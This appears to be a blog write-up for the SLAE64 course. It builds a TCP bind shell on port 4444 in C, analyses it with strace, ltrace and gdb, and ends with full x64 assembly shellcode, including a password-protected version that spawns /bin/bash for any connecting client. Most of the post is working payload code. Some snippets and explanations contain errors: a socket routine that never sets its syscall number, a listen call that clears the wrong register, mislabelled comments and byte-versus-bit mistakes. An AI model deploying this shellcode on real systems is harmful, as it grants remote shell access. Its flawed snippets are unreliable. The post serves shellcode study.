---
title: SLAE64 Assignment 1 - TCP Bind-Shell Shellcode
date: 2020-4-06
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Bind
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)


# Bindshell Analysis
To better understand x64 shellcode, I first created a working bindshell in C.

## Bindshell.c
```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdlib.h>
int main(void)
{
  int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  struct sockaddr_in ipSocketAddr = { 
    .sin_family = AF_INET, 
    .sin_port = htons(4444), 
    .sin_addr.s_addr = htonl(INADDR_ANY) 
  };
  bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
  listen(ipv4Socket, 0);
  int clientSocket = accept(ipv4Socket, NULL, NULL);
  dup2(clientSocket, 0);
  dup2(clientSocket, 1);
  dup2(clientSocket, 2);
  execve("/bin/bash", NULL, NULL);
}
```

### Compile Shellcode
```bash
root# uname -orm
5.3.0-amd64 x86_64 GNU/Linux
root# gcc bindshell.c -o bindshell
```

### Test Shellcode
#### Terminal 1
```bash 
root# ./bindshell

```
#### Terminal 2
```bash
root# nc 127.0.0.1 4444
whoami
root
```

### Function Analysis

#### 1. Create a new Socket.

```c 
socket(int domain, int type, int protocol); 
socket(AF_INET, SOCK_STREAM, IPPROTO_IP  );
```  

##### socket parameters

```c
int domain = AF_INET
```
+ IPv4 Internet protocols.

```c
int type = SOCK_STREAM
```
+ Provides sequenced, reliable, two-way, connection-based byte streams (TCP).

```c
int protocol = IPPROTO_IP
```
+ The protocol to be used with the socket.
+ With only one protocol option in the address family, the value `0x0` is used.

#### 2. Create an IP Socket Address structure.
```c
struct sockaddr_in {
  sa_family_t    sin_family; /* address family: AF_INET */
  in_port_t      sin_port;   /* port in network byte order */
  struct in_addr sin_addr;   /* internet address */
};
struct in_addr {
  uint32_t       s_addr;     /* address in network byte order */
}; 
struct sockaddr_in ipSocketAddr = { 
  .sin_family = AF_INET, 
  .sin_port = htons(4444), 
  .sin_addr.s_addr = htonl(INADDR_ANY) 
};
```
+ An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.

##### struct sockaddr parameters

```c
sa_family_t sin_family  = AF_INET
```
+ From Socket, we know that we will need to use the Address Family `AF_INET`  

```c
in_port_t sin_port      = htons(4444)
```
+ TCP Port 4444  
+ The `htons()` function converts our decimal integer to 16-byte little-endian hex (aka "network byte order")  
+ TCP ports are 16 bits (2 bytes).

```c
struct in_addr sin_addr = htonl(INADDR_ANY)
```
+ All interfaces.  
+ The `htonl()` function converts our decimal integer to 32-byte little-endian hex.
+ IPv4 addresses are 32 bits (4 bytes).

#### 3. Bind the IP Socket Address to Socket. 
```c
int bind(int sockfd, const struct sockaddr \*addr, socklen\_t addrlen);`

bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
```
+ For complete details see: `man bind`  

##### bind parameters

```c
sockfd = ipv4Socket
```
+ The socket file descriptor returned from `socket()` and saved as the variable `ipv4Socket`.  

```c
const struct sockaddr *addr = &ipSocketAddr
```
+ A pointer to the IP Socket Address structure `ipSocketAddr`.  

```c
socklen_t addrlen = sizeof(ipSocketAddr)
```
+ The byte length of our `ipSocketAddr` structure.  
+ `sizeof()` returns the length in bytes of the variable.  

#### 4. Listen for connections to the TCP Socket at the IP Socket Address.  
```c
int listen(int sockfd, int backlog);

listen(ipv4Socket, 0);
```  
+ For complete details see: `man listen`  

##### listen Parameters

```c
int sockfd  = ipv4Socket
```

```c
int backlog = 0
```
+ This is for handling multiple connections.   
+ We only need to handle one connection at a time, therefor we will set this value to `0`.   

#### 5. Accept connections to the TCP-IP Socket and create a Client Socket.  
```c
int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);

int clientSocket = accept(ipv4Socket, NULL, NULL);
```  
+ For complete details see: `man accept`  

##### accept parameters

```c
int sockfd = ipv4Socket
```

```c
struct sockaddr *addr = NULL
```
- This structure is filled in with the address of the peer socket.  

```c
socklen_t *addrlen = NULL
```
- When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.  

```c
int flags  = NULL
```
+ The function will return the new Socket File-Descriptor. Save as `clientSocket`  

#### 6. Transfer Standard-Input, Standard-Output, and Standard-Error to the client socket.  
```c
int dup2(int oldfd, int newfd);
dup2(clientSocket, 0); // STDIN
dup2(clientSocket, 1); // STDOUT
dup2(clientSocket, 2); // STDERR
```   
+ For complete details see: `man dup2` 
+ We will need to call this function 3 times to transfer Standard Input, Standard Output and Standard Error

#### 7. Spawn a `/bin/sh` shell for the client, in the connected session.  
```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
execve("/bin/sh", NULL, NULL);
```  
+ For complete details see: `man execve`  

##### execve() parameters
```c
const char *pathname = "/bin/sh"
```

```c
char *const argv[] = NULL
```

```c
char *const envp[] = NULL
```

### Trace System-Calls  
Use `strace` to see system calls as the `shellcode` executes.  
+ `strace` will show us all of the system calls that occur within the program.
+ _I removed all of the system-calls that were irrelevant from the system trace output._

```bash 
root# strace ./bindshell
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
```  
+ The returned `Socket File-Descriptor` for our new socket is '3'.

```bash
bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 0)                            = 0
accept(3, NULL, NULL

```
+ We can see our program hangs at `accept(`. 
+ To satisfy the accept function,  we connect with `nc 127.0.0.1 4444`.  

```bash
accept(3, NULL, NULL)                   = 4
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/bash", NULL, NULL)         = 0

```
+ The accept function takes in the socket handle returned from `socket()`, and returns a new socket handle `4` that will be used for the client connection.
+ We take the client socket handle `4` and use it as an arugment for our `dup2()` functions.
+ The `0`,`1`, and `2` are the handles for input, output and error.


### Trace Library Calls  
Use `ltrace` to see library calls as the program executes.  
+ _I removed all of the library calls that were irrelevant from the library trace output._

```bash
socket(2, 1, 0)                                      = 3
htons(4444, 1, 0, 0x7f05dfff78d7)                    = 0x5c11
htonl(0, 1, 0, 0x7f05dfff78d7)                       = 0
bind(3, 0x7ffe5256d920, 16, 0x7ffe5256d920)          = 0
listen(3, 0, 16, 0x7f05dfff72a7)                     = 0
accept(3, 0, 0, 0x7f05dfff7407)                      = 4
dup2(4, 0)                                           = 0
dup2(4, 1)                                           = 1
dup2(4, 2)                                           = 2
execve(0x5597bd4ce004, 0, 0, 0x7f05dffe8027 <no return ...>

```

## GDB Analysis

#### Calling Order for System Calls
1. RAX = System Call Number
2. RDI = 1st Argument
3. RSI = 2nd Argument
4. RDX = 3rd Argument

### bind()
```bash
root# gdb ./bindshell
GNU gdb (Debian 8.3.1-1) 8.3.1

gdb-peda$ info functions
0x0000000000001030  htons@plt
0x0000000000001040  dup2@plt
0x0000000000001050  htonl@plt
0x0000000000001060  execve@plt
0x0000000000001070  listen@plt
0x0000000000001080  bind@plt
0x0000000000001090  accept@plt
0x00000000000010a0  socket@plt

gdb-peda$ break bind@plt
Breakpoint 1 at 0x1080
gdb-peda$ run
```

##### RAX = 0x31 - bind syscall
```bash 
=> 0x7ffff7edf2a0 <bind>:       mov    eax,0x31
```

##### RDI = 0x3 - int sockfd
+ returned from socket()

```bash 
RDI: 0x3
```

##### RSI = `const struct sockaddr *addr`
```bash 
RSI: 0x7fffffffe130 --> 0x5c110002

gdb-peda$ hexdump 0x7fffffffe130 16
0x00007fffffffe130 : 02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00   ...\............

```

##### RDX = `socklen_t addrlen`
```bash 
RDX: 0x10
```
+ 0x10 is 16 bytes 

+ Mod bindshell.c

```c
    struct sockaddr_in ipSocketAddr = {
        .sin_family = AF_INET,
        .sin_port = htons(4444),
        .sin_addr.s_addr = inet_addr("64.128.128.193")
    };
```

+ Compile & investigate changes:

```bash
root# gcc bindshell.c -o bshell2
root# gdb ./bshell2
gdb-peda$ b bind@plt
gdb-peda$ r

### STACK ###
0008| 0x7fffffffe130 --> 0xc18080405c110002
0016| 0x7fffffffe138 --> 0x0

### MEMORY EXAMINE ###
gdb-peda$ x/16b 0x00007fffffffe130
0x7fffffffe130: 0x02    0x00    0x11    0x5c    0x40    0x80    0x80    0xc1
0x7fffffffe138: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

gdb-peda$ hexdump 0x00007fffffffe130 16
0x00007fffffffe130 : 02 00 11 5c 40 80 80 c1 00 00 00 00 00 00 00 00   ...\@...........
```

+ we can see that changing the `sin_addr.s_addr` parameter changes the 4 bytes from 5 to 8

```bash 
gdb-peda$ hexdump 0x00007fffffffe134 4
0x00007fffffffe134 : 40 80 80 c1
```

```bash 
# The 16 byte struct for the sockaddr_in
         02 00 11 5c 40 80 80 c1 00 00 00 00 00 00 00 00
Address-Family| PORT| IP Address| 8 bytes of unused space in IPv4?
```

+ `man bind` shows that the sockaddr stuct is 16 bytes which is what we see from inspecting the assembly.

```c
struct sockaddr {
  sa_family_t sa_family;
  char        sa_data[14];
}
```

# Bindshell Assembly
+ We will state what the assembly parameters will be at time of SYSCALL

## Socket
+ RAX = 0x29
  - socket syscall

```bash
gdb-peda$ b socket@plt
Breakpoint 1 at 0x10a0
gdb-peda$ r
=> 0x7ffff7edf8d0 <socket>:     mov    eax,0x29
   0x7ffff7edf8d5 <socket+5>:   syscall
```

+ RDI = 0x2
  - `AF_INET`
+ RSI = 0x1
  - `SOCK_STREAM`
+ RDX = 0x0
  - `IPPROTO_IP`

### Socket Assembly
```nasm
; int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
; rax = 0x29
; rdi = 0x2  = AF_INET
; rsi = 0x1  = SOCK_STREAM
; rdx = 0x0  = IPPROTO_IP

xor rsi, rsi   ; clear rsi
mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
inc rsi        ; rsi = 0x1 = SOCK_STREAM
push rsi
pop rdi        ; rdi = 0x1
inc rdi        ; rdi = 0x2 = AF_INET
syscall        ; socket syscall ; RAX returns socket File-Descriptor
push rax       ; [RSP] = sockfd
```

## Bind 
+ RAX = 0x31 
  - bind syscall
+ RDI = 0x3 
  - int sockfd
+ RSI = Pointer to 16 bytes on the stack
  - `const struct sockaddr *addr`
```bash
# stuct sockaddr breakdown
         02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00 
Address-Family| PORT| IP Address| 8 bytes of zeros

```
  - Address-Family = `02 00`
  - PORT = `11 5c`
    - TCP Port 4444
  - IP Address = `00 00 00 00`
  - 8 bytes of zeros = `00 00 00 00 00 00 00 00`
+ RDX = 0x10 (16 bytes / the size of the struct)
  - `socklen_t addrlen`

### Bind Assembly
```nasm 
; bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
; rax = 0x31
; rdi = 0x3  =  ipv4Socket
; rsi = &ipSocketAddr
;          02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00
; Address-Family| PORT| IP Address| 8 bytes of zeros
; rdx = 0x10 

xchg rdi, rax    ; RDI = sockfd / ipv4Socket
xor rax, rax
add al, 0x31     ; rax = 0x31 = socket syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dx         ; 4 bytes of zeros for IPADDR_ANY
push dx         ; 4 bytes of zeros for IPADDR_ANY
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          ; rdx = 0x2 ; dx = 0x0002
push dx          ; 0x2 = AF_INET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall
```

### Testing
```bash
root# nasm -f elf64 bindshell.asm -o bindshell.o
root# ld bindshell.o -o bindshell
root# gdb ./bindshell
[-------------------------------------code-------------------------------------]
   0x401025 <_start+37>:        inc    rdx
   0x401028 <_start+40>:        push   dx
   0x40102a <_start+42>:        mov    rsi,rsp
=> 0x40102d <_start+45>:        syscall

gdb-peda$ x/16x $rsp
0x7fffffffe1f0: 0x02    0x00    0x11    0x5c    0x00    0x00    0x00    0x00
0x7fffffffe1f8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

gdb-peda$ hexdump $rsp 16
0x00007fffffffe1f0 : 02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00   ...\............
```

## Listen
+ RAX = 0x32
  - listen system call
```bash
=> 0x7ffff7edf400 <listen>:     mov    eax,0x32
   0x7ffff7edf405 <listen+5>:   syscall
```

+ RDI = 0x3
  - sockfd / socket file-descriptor returned from `socket()`
+ RSI = 0x0
  - backlog

#### Listen Assembly
```nasm
; int listen(int sockfd, int backlog);
; rax = 0x32    = listen syscall
; rdi = sockfd  = 0x3 = ipv4Socket
; rsi = backlog = 0

xor rax, rax
add al, 0x32
xor rdi, rdi
syscall
```

## Accept
+ RAX = 0x2b
  - accept syscall

```bash
0x7ffff7edf20d <__libc_accept+13>:   mov    eax,0x2b
0x7ffff7edf212 <__libc_accept+18>:   syscall
```

+ RDI = 0x3
  - sockfd / socket file-descriptor returned from `socket()`

+ RSI = NULL / 0x0
  - `sock addr *addr`

+ RDX = NULL / 0x0
  - `socklen_t *addrlen`

##### Accept Assembly
```nasm
;accept
; rax = 0x2b
; rdi = sockfd  = 0x3 = ipv4Socket
; rsi = 0x0
; rdx = 0x0

xor rax, rax
push rax
push rax
pop rdx
pop rsi
add al, 0x2b
syscall       ; accept returns client socket file-descriptor in RAX
```

## Dup2
+ we need to call this 3 times

+ RAX = 0x21

```bash
=> 0x7ffff7ed0020 <dup2>:       mov    eax,0x21
   0x7ffff7ed0025 <dup2+5>:     syscall
```

+ RDI = 0x4
  - `int oldfd` 
  - This is the socket file descriptor returned from the `accept()` function
  - This will change and need to be referenced dynamically

#### Loop through dup2() 3 times 
##### First dup2 call
+ RSI = 0x0
  - `int newfd`
  - Standard Input file descriptor

##### Second dup2 call
+ RSI = 0x1
  - `int newfd`
  - Standard Output file descriptor

##### Third dup2 call
+ RSI = 0x2
  - `int newfd`
  - Standard Error file descriptor

##### dup2 Assembly

```nasm
; dup2
xchg rdi, rax    ; RDI = sockfd / ClientSocketFD
xor rsi, rsi
add dl, 0x3      ; Loop Counter

dup2Loop:
xor rax, rax
add al, 0x21     ; RAX = 0x21 = dup2 systemcall
syscall          ; call dup2 x3 to redirect STDIN STDOUT STDERR
inc rsi
cmp rsi, rdx     ; if 2-STDERR, end loop
jne dup2Loop
```

## Execve
+ RAX = 0x3b
```bash
=> 0x7ffff7eabe80 <execve>:     mov    eax,0x3b
   0x7ffff7eabe85 <execve+5>:   syscall
```
+ RDI = Pointer to "/bin/bash" 
  - `const char *pathname = "/bin/bash"`
  - Must be null terminated (end the string with a 0x00)

```bash
RDI: 0x555555556004 ("/bin/bash")
gdb-peda$ x/10b 0x555555556004
0x555555556004: 0x2f    0x62    0x69    0x6e    0x2f    0x62    0x61    0x73
0x55555555600c: 0x68    0x00
gdb-peda$ x/s 0x555555556004
0x555555556004: "/bin/bash"
```

+ RSI = 0x0
`char *const argv[]`

+ RDX = 0x0
`char *const envp[]`


#### Execve Assembly

```nasm
i;execve
; rax = 0x3b
; rdi = Pointer -> "/bin/bash"0x00
;root# python reverse.py "/bin/bash"
;String length : 9
;h : 68
;sab/nib/ : 7361622f6e69622f
; rsi = 0x0
; rdx = 0x0

xor rsi, rsi
mul rsi          ; rdx&rax= 0x0
xor rdi, rdi
push rdi
add rdx, 0x68
push rdx
mov rdx, 0x7361622f6e69622f ; "/bin/bas"
push rdx
xor rdx, rdx
mov rdi, rsp
mov al, 0x3b
syscall  ; call execve("/bin/bash", NULL, NULL)
```

# Bindshell Assembly with Password

```nasm
global _start

section .text

_start:
; int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
; rax = 0x29
; rdi = 0x2  = AF_INET
; rsi = 0x1  = SOCK_STREAM
; rdx = 0x0  = IPPROTO_IP

xor rsi, rsi   ; clear rsi
mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
add al, 0x29   ; rax = 0x29 = socket syscall
inc rsi        ; rsi = 0x1 = SOCK_STREAM
push rsi
pop rdi        ; rdi = 0x1
inc rdi        ; rdi = 0x2 = AF_INET
syscall        ; socket syscall ; RAX returns socket File-Descriptor


; bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
; rax = 0x31
; rdi = 0x3  =  ipv4Socket
; rsi = &ipSocketAddr
;          02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00
; Address-Family| PORT| IP Address| 8 bytes of zeros
; rdi = 0x10

xchg rdi, rax    ; RDI = sockfd / ipv4Socket
xor rax, rax
add al, 0x31     ; rax = 0x31 = socket syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dx         ; 4 bytes of zeros for IPADDR_ANY
push dx         ; 4 bytes of zeros for IPADDR_ANY
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          ; rdx = 0x2 ; dx = 0x0002
push dx          ; 0x2 = AF_INET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall

; int listen(int sockfd, int backlog);
; rax = 0x32    = listen syscall
; rdi = sockfd  = 0x3 = ipv4Socket
; rsi = backlog = 0

xor rax, rax
add al, 0x32
xor rsi, rsi
syscall


;accept
; rax = 0x2b
; rdi = sockfd  = 0x3 = ipv4Socket
; rsi = 0x0
; rdx = 0x0

xor rax, rax
push rax
push rax
pop rdx
pop rsi
add al, 0x2b
syscall       ; accept returns client socket file-descriptor in RAX

; dup2
xchg rdi, rax    ; RDI = sockfd / ClientSocketFD
xor rsi, rsi
add dl, 0x3      ; Loop Counter

dup2Loop:
xor rax, rax
add al, 0x21     ; RAX = 0x21 = dup2 systemcall
syscall          ; call dup2 x3 to redirect STDIN STDOUT STDERR
inc rsi
cmp rsi, rdx     ; if 2-STDERR, end loop
jne dup2Loop

jmp short password

failer:
; write
; rax = 0x1
; rdi = fd = 0x1 STDOUT
; rsi = &String
; rdx = sizeof(String)
;root# python reverse.py "REALLY?!"
;String length : 8
;!?YLLAER : 213f594c4c414552

xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
mov rsi, 0x213f594c4c414552
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 16     ; 16 bytes / size of string
syscall

password:
; write
; rax = 0x1
; rdi = fd = 0x1 STDOUT
; rsi = &String
; rdx = sizeof(String)
;root# python reverse.py "M@G1C WOrDz IZ??"
;String length : 16
;??ZI zDr : 3f3f5a49207a4472
;OW C1G@M : 4f5720433147404d

xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
mov rsi, 0x3f3f5a49207a4472
push rsi
mov rsi, 0x4f5720433147404d
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 16     ; 16 bytes / size of string
syscall


; read
; rax = 0x0 = read systemcall
; rdi = fd = 0x0 STDIN
; rsi = Write to &String
; rdx = 0x12 = sizeof(String)
xor rdi, rdi
push rdi
mul rdi         ; rdx =0x0 ; rax = 0x0 = write system call
mov rsi, rsp    ; rsi = [RSP] = &String
add rdx, 12     ; 12 bytes / size of password
syscall

; String = P3WP3Wl4ZerZ
;   String length : 12
;     ZreZ : 5a72655a
;     4lW3PW3P : 346c573350573350
mov rdi, rsp
xor rsi, rsi
add rsi, 0x5a72655a
push rsi
mov rsi, 0x346c573350573350
push rsi
mov rsi, rsp    ; rsi = &String
xor rcx, rcx
add rcx, 0xB
repe cmpsb
jnz failer

;execve
; rax = 0x3b
; rdi = Pointer -> "/bin/bash"0x00
;root# python reverse.py "/bin/bash"
;String length : 9
;h : 68
;sab/nib/ : 7361622f6e69622f
; rsi = 0x0
; rdx = 0x0

xor rsi, rsi
mul rsi          ; rdx&rax= 0x0
xor rdi, rdi
push rdi
add rdx, 0x68
push rdx
mov rdx, 0x7361622f6e69622f ; "/bin/bas"
push rdx
xor rdx, rdx
mov rdi, rsp
mov al, 0x3b
syscall  ; call execve("/bin/bash", NULL, NULL)
```
